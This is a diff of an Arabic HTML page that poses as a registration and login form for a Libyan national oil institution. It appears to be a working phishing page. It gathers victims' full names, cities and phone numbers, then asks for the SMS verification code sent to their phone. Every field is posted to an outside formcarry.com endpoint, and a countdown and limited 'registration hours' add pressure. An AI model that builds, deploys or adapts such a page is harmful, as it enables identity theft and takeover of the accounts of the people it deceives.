@@ -1,243 +1,427 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>شركة ليبيا للنفط - نموذج الطلب</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>المؤسسة الوطنــية</title>
+  <link rel="icon" href="uy.jpeg" type="image/png">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #ffffff;
-      padding: 20px;
-      direction: rtl;
-      text-align: right;
-      color: #1c1c1c;
-    }
-
-    header {
-      background-color: #226c2b;
-      color: white;
-      padding: 15px 20px;
+      font-family: 'Cairo', sans-serif;
+      background: linear-gradient(135deg, #002147, #003366);
       display: flex;
+      justify-content: center;
       align-items: center;
-      justify-content: space-between;
-      border-bottom: 4px solid #af1d1d;
-      border-radius: 12px;
-      max-width: 420px;
-      margin: auto;
-    }
-
-    header img {
-      height: 50px;
-      margin-left: 15px;
-    }
-
-    header h1 {
-      font-size: 20px;
+      height: 100vh;
       margin: 0;
+      direction: rtl;
     }
 
-    form, .code-box, #waitingPage {
-      background: #fefefe;
-      padding: 20px;
-      border-radius: 12px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.08);
+    .container {
+      background: #fff;
+      border-radius: 20px;
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.25);
+      padding: 35px 40px;
+      width: 96%;
       max-width: 420px;
-      margin: 30px auto;
-      border-right: 5px solid #af1d1d;
+      box-sizing: border-box;
+      text-align: center;
+      z-index: 1;
     }
 
-    h2, h3 {
-      color: #af1d1d;
+    .logo-container {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .logo-container img {
+      width: 90px;
+      height: 90px;
+      object-fit: contain;
+      margin: 0 auto;
+      display: block;
+    }
+
+    .logo-container p {
+      margin-top: 8px;
+      font-weight: 700;
+      color: #003366;
+      font-size: 16px;
+    }
+
+    h2 {
+      margin-bottom: 25px;
+      color: #003366;
+      font-weight: 900;
+      font-family: Arial, Helvetica, sans-serif;
+      font-size: 32px;
     }
 
     label {
       display: block;
-      margin-top: 12px;
-      font-weight: bold;
-      color: #1c1c1c;
+      margin-bottom: 8px;
+      font-weight: 600;
+      color: #222;
+      text-align: right;
     }
 
-    input, select {
+    input[type="tel"],
+    input[type="text"],
+    select {
       width: 100%;
-      padding: 10px;
-      margin-top: 6px;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-      background-color: #f9f9f9;
+      padding: 12px 15px;
+      font-size: 16px;
+      border-radius: 10px;
+      border: 1.8px solid #bbb;
+      margin-bottom: 18px;
+      transition: border-color 0.3s ease;
+      box-sizing: border-box;
+      font-family: inherit;
+    }
+
+    input:focus,
+    select:focus {
+      border-color: gold;
+      outline: none;
+    }
+
+    input:disabled,
+    select:disabled {
+      background-color: #f2f2f2;
     }
 
     button {
-      margin-top: 20px;
-      width: 100%;
+      width: 40%;
       padding: 12px;
-      background-color: #226c2b;
-      color: white;
+      font-size: 17px;
+      background-color: gold;
       border: none;
-      border-radius: 8px;
-      font-size: 16px;
+      border-radius: 10px;
+      color: #002147;
       cursor: pointer;
-      transition: 0.3s;
+      font-weight: bold;
+      font-family: Calibri, sans-serif;
+      transition: background-color 0.3s ease;
+      margin-bottom: 15px;
     }
 
-    button:hover {
-      background-color: white;
-      color: #226c2b;
-      border: 1px solid #226c2b;
+    button:hover:not(:disabled) {
+      background-color: #e6c200;
     }
 
     button:disabled {
-      background-color: #ccc;
+      background-color: #c2a300;
       cursor: not-allowed;
     }
 
-    .code-box, #waitingPage {
-      display: none;
+    #timer {
+      text-align: center;
+      font-weight: 600;
+      color: black;
+      margin-bottom: 20px;
+      min-height: 24px;
     }
 
-    .timer {
-      margin-top: 12px;
-      color: #af1d1d;
-      font-weight: bold;
+    #codeField {
+      display: none;
     }
 
     .error {
       color: red;
-      font-size: 13px;
+      font-size: 14px;
+      margin-top: -10px;
+      margin-bottom: 15px;
+    }
+
+    .note-time {
+      color: #b30000;
+      font-weight: bold;
+      margin-top: 15px;
+      font-size: 15px;
+    }
+
+    #countdownOverlay {
       display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.85);
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      flex-direction: column;
+      text-align: center;
+      font-family: 'Cairo', sans-serif;
+    }
+
+    #countdownOverlay h2 {
+      font-size: 28px;
+      margin-bottom: 20px;
+    }
+
+    #countdownText {
+      font-size: 36px;
+      font-weight: bold;
     }
   </style>
 </head>
 <body>
 
-<!-- ✅ الترويسة -->
-<header>
-  <div style="display: flex; align-items: center;">
-    <img src="logo.png" alt="شعار الشركة" onerror="this.style.display='none';">
-    <h1>شركة ليبيا للنفط</h1>
+  <div id="countdownOverlay">
+    <h2>🚫 التسجيل غير متاح حالياً</h2>
+    <div id="countdownText">00:00:00</div>
   </div>
-</header>
 
-<!-- ✅ النموذج الأول -->
-<form id="mainForm" action="https://formcarry.com/s/12UxdOsTbaW" method="POST" onsubmit="handleSubmit(event)">
-  <h2>نموذج تقديم طلب</h2>
+  <div class="container">
+    <div class="logo-container">
+      <img src="uy.jpeg" alt="شعار المؤسسة الليبية للعمل النفطي" />
+      <p>التسجيل في منظومة المؤسسة الليبية للعمل النفطي</p>
+    </div>
 
-  <label for="fullName">الاسم الثلاثي</label>
-  <input type="text" id="fullName" name="fullName" required oninput="validateForm()">
-  <div class="error" id="nameError">يجب أن يكون الاسم أكثر من 7 أحرف عربية فقط.</div>
+    <h2>تسجيل الدخول</h2>
 
-  <label for="phone">رقم الهاتف</label>
-  <input type="tel" id="phone" name="phone" required oninput="validateForm()">
+    <!-- نموذج البيانات الأساسي -->
+    <form id="phoneForm" onsubmit="return sendPhone(event);">
+      <!-- الاسم الثلاثي -->
+      <label for="fullname">الاسم الثلاثي:</label>
+      <input type="text" id="fullname" name="fullname" required placeholder="اكتب اسمك الثلاثي"
+             pattern="[\u0600-\u06FF\s]{8,}" title="يجب أن يكون الاسم باللغة العربية ولا يقل عن 8 أحرف" />
 
-  <label for="address">المدينة</label>
-  <select id="address" name="address" required onchange="validateForm()">
-    <option value="">اختر المدينة</option>
-    <option>طرابلس</option>
-    <option>بنغازي</option>
-    <option>مصراتة</option>
-    <option>البيضاء</option>
-    <option>زليتن</option>
-    <option>سبها</option>
-    <option>الخمس</option>
-    <option>درنة</option>
-    <option>سرت</option>
-    <option>طبرق</option>
-  </select>
+      <!-- السكن: قائمة مدن ليبيا -->
+      <label for="city">السكن:</label>
+      <select id="city" name="city" required>
+        <option value="" disabled selected>اختر المدينة</option>
+        <option value="طرابلس">طرابلس</option>
+        <option value="بنغازي">بنغازي</option>
+        <option value="مصراتة">مصراتة</option>
+        <option value="سبها">سبها</option>
+        <option value="البيضاء">البيضاء</option>
+        <option value="زليتن">زليتن</option>
+        <option value="طبرق">طبرق</option>
+        <option value="الخمس">الخمس</option>
+        <option value="درنة">درنة</option>
+        <option value="اجدابيا">اجدابيا</option>
+        <option value="غريان">غريان</option>
+        <option value="الزاوية">الزاوية</option>
+        <option value="صبراتة">صبراتة</option>
+        <option value="صرمان">صرمان</option>
+        <option value="نالوت">نالوت</option>
+        <option value="غات">غات</option>
+        <option value="الكفرة">الكفرة</option>
+        <option value="مرزق">مرزق</option>
+        <option value="زوارة">زوارة</option>
+      </select>
 
-  <button type="submit" id="submitBtn" disabled>أكمل الطلب</button>
-</form>
+      <!-- رقم الهاتف -->
+      <label for="phone">رقم الهاتف:</label>
+      <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" autocomplete="tel" />
 
-<!-- ✅ مرحلة الكود -->
-<div class="code-box" id="codeBox">
-  <h3>يرجى إدخال كود التوثيق</h3>
-  <input type="text" id="verificationCode" placeholder="أدخل الكود (6–8 أرقام أو أحرف)" required>
-  <button onclick="submitCode()">إرسال</button>
-  <div class="timer" id="timer">الوقت المتبقي: 08:00</div>
-</div>
+      <button type="submit" id="sendPhoneBtn">أرسل كود</button>
+      <div id="timer"></div>
+    </form>
 
-<!-- ✅ صفحة الانتظار -->
-<div id="waitingPage">
-  <h2>تم استلام الكود</h2>
-  <p>طلبك قيد المراجعة. الرجاء العودة بعد ساعة.</p>
-</div>
+    <!-- نموذج إدخال الكود -->
+    <form id="codeForm" onsubmit="return sendCode(event);">
+      <div id="codeField">
+        <label for="code">جاري إرسال الكود عبر SMS</label>
+        <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" autocomplete="one-time-code" />
+        <div id="errorMessage" class="error"></div>
+        <button type="submit" id="sendCodeBtn">طلب الدخول</button>
+      </div>
+    </form>
 
-<!-- ✅ سكربت التحقق والتبديل -->
-<script>
-  function validateForm() {
-    const name = document.getElementById("fullName").value.trim();
-    const phone = document.getElementById("phone").value.trim();
-    const address = document.getElementById("address").value;
-    const nameError = document.getElementById("nameError");
+    <p class="note-time">🕒 وقت التسجيل: من الساعة 8:00م حتى الساعة 10:00م</p>
+  </div>
 
-    const nameIsValid = /^[\u0600-\u06FF\s]{8,}$/.test(name);
-    const phoneIsValid = /^\d{10,15}$/.test(phone);
-    const addressIsValid = address !== "";
-
-    nameError.style.display = (!nameIsValid && name.length > 0) ? "block" : "none";
-
-    document.getElementById("submitBtn").disabled = !(nameIsValid && phoneIsValid && addressIsValid);
-  }
-
-  function handleSubmit(event) {
-    event.preventDefault();
-    const form = document.getElementById("mainForm");
-    const formData = new FormData(form);
-
-    fetch(form.action, {
-      method: "POST",
-      body: formData
-    })
-    .then(res => {
-      if (res.ok) {
-        form.style.display = "none";
-        document.getElementById("codeBox").style.display = "block";
-        startTimer(8 * 60);
-      } else {
-        alert("فشل في إرسال البيانات.");
-      }
-    })
-    .catch(err => {
-      console.error("خطأ في الاتصال:", err);
-      alert("حدث خطأ في الاتصال.");
-    });
-  }
-
-  function submitCode() {
-    const code = document.getElementById("verificationCode").value.trim();
-    const codeIsValid = /^[A-Za-z0-9]{6,8}$/.test(code);
-
-    if (!codeIsValid) {
-      alert("يرجى إدخال كود صحيح (6–8 أحرف أو أرقام).");
-      return;
+  <script>
+    // التحقق من وقت التسجيل (8:00 - 10:00 مساءً)
+    function isWithinTime() {
+      const now = new Date();
+      const hour = now.getHours();
+      return hour >= 20 && hour < 22; // 8:00 - 10:00 مساءً
     }
 
-    document.getElementById("codeBox").style.display = "none";
-    document.getElementById("waitingPage").style.display = "block";
+    function getNextOpenTime() {
+      const now = new Date();
+      const openTime = new Date();
+      openTime.setHours(20, 0, 0, 0); // الساعة 8:00 مساءً
 
-    fetch("https://formcarry.com/s/12UxdOsTbaW", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ code: code })
-    }).catch(error => console.error("Formcarry Error:", error));
-  }
-
-  function startTimer(duration) {
-    let timer = duration;
-    const display = document.getElementById("timer");
-
-    const interval = setInterval(() => {
-      const minutes = String(Math.floor(timer / 60)).padStart(2, '0');
-      const seconds = String(timer % 60).padStart(2, '0');
-      display.textContent = `الوقت المتبقي: ${minutes}:${seconds}`;
-      timer--;
-
-      if (timer < 0) {
-        clearInterval(interval);
-        display.textContent = "انتهى الوقت!";
+      if (now.getHours() >= 22) {
+        openTime.setDate(openTime.getDate() + 1);
+      } else if (now.getHours() < 20) {
+        // نفس اليوم
+      } else {
+        openTime.setDate(openTime.getDate() + 1);
       }
-    }, 1000);
-  }
-</script>
+
+      return openTime;
+    }
+
+    function updateCountdown() {
+      const overlay = document.getElementById("countdownOverlay");
+      const countdownText = document.getElementById("countdownText");
+      const phoneForm = document.getElementById("phoneForm");
+      const codeForm = document.getElementById("codeForm");
+
+      if (isWithinTime()) {
+        overlay.style.display = "none";
+        phoneForm.style.display = 'block';
+        codeForm.style.display = 'block';
+        return;
+      }
+
+      overlay.style.display = "flex";
+      phoneForm.style.display = 'none';
+      codeForm.style.display = 'none';
+
+      const now = new Date();
+      const openTime = getNextOpenTime();
+      const diff = Math.max(0, Math.floor((openTime - now) / 1000));
+
+      const hours = Math.floor(diff / 3600).toString().padStart(2, '0');
+      const minutes = Math.floor((diff % 3600) / 60).toString().padStart(2, '0');
+      const seconds = (diff % 60).toString().padStart(2, '0');
+
+      countdownText.textContent = `الفتح خلال: ${hours}:${minutes}:${seconds}`;
+    }
+
+    setInterval(updateCountdown, 1000);
+    window.onload = updateCountdown;
+
+    // وظائف النماذج
+    let countdownInterval;
+    const sendPhoneBtn = document.getElementById('sendPhoneBtn');
+    const timerDisplay = document.getElementById('timer');
+    const codeField = document.getElementById('codeField');
+    const phoneInput = document.getElementById('phone');
+    const codeInput = document.getElementById('code');
+    const errorMessage = document.getElementById('errorMessage');
+
+    function startTimer(duration) {
+      let timeLeft = duration;
+      timerDisplay.style.display = 'block';
+      updateTimer(timeLeft);
+      countdownInterval = setInterval(() => {
+        timeLeft--;
+        updateTimer(timeLeft);
+        if (timeLeft <= 0) {
+          clearInterval(countdownInterval);
+          timerDisplay.style.display = 'none';
+          sendPhoneBtn.disabled = false;
+          phoneInput.disabled = false;
+        }
+      }, 1000);
+    }
+
+    function updateTimer(seconds) {
+      const minutes = Math.floor(seconds / 60).toString().padStart(2, '0');
+      const secs = (seconds % 60).toString().padStart(2, '0');
+      timerDisplay.textContent = `يرجى الانتظار: ${minutes}:${secs}`;
+    }
+
+    // دالة إرسال البيانات (الاسم، السكن، رقم الهاتف)
+    function sendPhone(event) {
+      event.preventDefault();
+
+      const fullname = document.getElementById('fullname').value.trim();
+      const city = document.getElementById('city').value;
+      const phone = phoneInput.value.trim();
+
+      // تحقق من الاسم: يجب أن يكون باللغة العربية و8 أحرف فأكثر
+      const arabicNamePattern = /^[\u0600-\u06FF\s]{8,}$/;
+      if (!arabicNamePattern.test(fullname)) {
+        alert('❌ يجب أن يكون الاسم باللغة العربية ولا يقل عن 8 أحرف.');
+        return false;
+      }
+
+      if (!city) {
+        alert('❌ يرجى اختيار المدينة.');
+        return false;
+      }
+
+      if (!phone.match(/^[0-9]{10,15}$/)) {
+        alert('❌ يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً.');
+        return false;
+      }
+
+      // إرسال البيانات إلى Formcarry
+      fetch('https://formcarry.com/s/12UxdOsTbaW', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify({
+          fullname: fullname,
+          city: city,
+          phone: phone
+        })
+      })
+      .then(response => {
+        if (!response.ok) throw new Error('فشل إرسال البيانات');
+
+        // تعطيل حقل الهاتف والزر
+        phoneInput.disabled = true;
+        sendPhoneBtn.disabled = true;
+        // عرض قسم إدخال الكود
+        codeField.style.display = 'block';
+        // بدء المؤقت (8 دقائق)
+        startTimer(480);
+      })
+      .catch(error => {
+        alert('⚠️ تعذر إرسال البيانات. حاول مرة أخرى.');
+        console.error(error);
+      });
+
+      return false;
+    }
+
+    // دالة إرسال الكود (تُرسل فقط الكود ورقم الهاتف)
+    function sendCode(event) {
+      event.preventDefault();
+      errorMessage.textContent = '';
+
+      if (codeInput.value.trim() === '') {
+        errorMessage.textContent = 'يرجى كتابة الكود المرسل إليك.';
+        codeInput.focus();
+        return false;
+      }
+
+      const payload = {
+        phone: phoneInput.value,
+        code: codeInput.value
+      };
+
+      fetch('https://formcarry.com/s/12UxdOsTbaW', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      })
+      .then(async response => {
+        const data = await response.json();
+
+        if (response.ok && data.success !== false) {
+          window.location.href = 'success.html';
+        } else {
+          errorMessage.textContent = '❌ هناك خطأ في الكود المرسل. حاول مرة أخرى.';
+        }
+      })
+      .catch(error => {
+        errorMessage.textContent = '⚠️ تعذر الاتصال بالخادم.';
+        console.error(error);
+      });
+
+      return false;
+    }
+  </script>
 
 </body>
 </html>
